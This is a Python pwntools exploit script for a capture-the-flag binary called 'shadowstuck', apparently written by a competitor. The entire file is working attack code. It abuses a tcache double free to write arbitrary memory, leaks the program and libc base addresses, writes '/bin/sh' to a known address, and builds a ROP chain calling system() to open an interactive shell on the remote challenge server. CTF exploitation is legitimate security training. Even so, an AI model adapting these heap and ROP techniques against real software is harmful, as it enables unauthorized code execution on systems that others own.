#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./shadowstuck"
LIBCNAME = "./libc-2.31.so"

hosts = ("challenges.ctf.kaf.sh","localhost","localhost")
ports = (8000,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

count = 0
employees = {}

def hoge(a):
  global c
  c.recvuntil("> ")
  c.sendline(a)

def _add(name):
  global c
  global count, employees
  hoge("A")
  c.recvuntil("> ")
  c.sendline(name)
  employees[name] = count
  count += 1

def _read(_id):
  hoge("R")
  c.recvuntil("> ")
  c.sendline(str(_id))
  c.recvuntil(" has name: ")
  return c.recvline().rstrip()

def _fire(_id, reason=None):
  hoge("F")
  c.recvuntil("> ")
  c.sendline(str(_id))
  c.recvuntil("> ")
  if(reason==None):
    _reason = "X"*0x10
  else:
    _reason = reason
  c.sendline(_reason)

def _change(_id, name):
  hoge("C")
  c.recvuntil("> ")
  c.sendline(str(_id))
  c.recvuntil("> ")
  c.sendline(name)

def _quit(data):
  hoge("Q")
  c.recvline()
  if(len(data)!=0x40):
    c.sendline(data)
  else:
    c.send(data) # fgets(0x40)

## exploit ###########################################

def exploit():
  global c
  c.recvuntil("Shadow stack set up at ")
  shadowstack = int(c.recvline().rstrip(), 16)
  print("[+] shadowstack: "+hex(shadowstack))

  _add("A"*0x8)
  _add("B"*0x8)
  _add("C"*0x8)
  
  # leak textbase
  _fire("A"*0x8, "X"*0x10 + p64(shadowstack + 0x10))
  leaked = unpack(_read(1).ljust(8,'\x00'))
  main_addr = leaked + 0x52
  print("[+] leaked: "+hex(leaked))
  print("[+] mainaddr: "+hex(main_addr))
  
  # place /bin/sh at known addr (=SHADOWSTACK + 0x20)
  _change(0,"A"*0xe) # avoid detecting double free (tcache2)
  _fire("A"*0xe, "X"*0x10 + p64(shadowstack+0x20)[:7]) # double free tcache(0x20)
  c.sendline("C")
  _change(1, "/bin/sh")

  # leak libcbase
  _change(0,"A"*0xe) # avoid detecting double free (tcache2)
  c.send("F") # somehow, ignored
  _fire("A"*0xe, "X"*0x10 + p64(shadowstack)[:7]) # double free tcache(0x20)
  c.sendline("")
  leaked = unpack(_read(1).ljust(8,'\x00'))
  libcbase = leaked - 0x270b3
  print("[+] leaked: "+hex(leaked))
  print("[+] libcbase: "+hex(libcbase))


  # あああああああああああああああ、ROP組むか
  # edit shadowstack
  pop_rdi = libcbase + 0x00026b72
  pop_r12 = libcbase + 0x00032b59
  pop_rbp = libcbase + 0x000256c0
  pop_rbx = libcbase + 0x000331ff
  pop_rdx = libcbase + 0x0015509f
  pop_rsi = libcbase + 0x00027529
  ogs = [0xe6ce3, 0xe6ce6, 0xe6ce9]
  og = libcbase + 0x54f7b
  og2 = libcbase + 0x54fe2
  system_addr = libcbase + libc.symbols["system"]
  ret_gad = libcbase + 0x00025679 # avoid movaps

  target = pop_rdi
  _change(1, p64(target)[:7]) # 0x7f1e18e350b3 <__libc_start_main+243>:      mov    edi,eax

  print("[ ] system: "+hex(system_addr))

  pay = b""
  pay += p8(0) * 0x9
  pay += p64(0) # rbx
  pay += p64(0) # rbp
  pay += p64(target) # ret
  pay += p64(shadowstack + 0x20)
  pay += p64(ret_gad)
  pay += p64(system_addr)
  assert len(pay) < 0x40-1

  _quit(pay)



## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
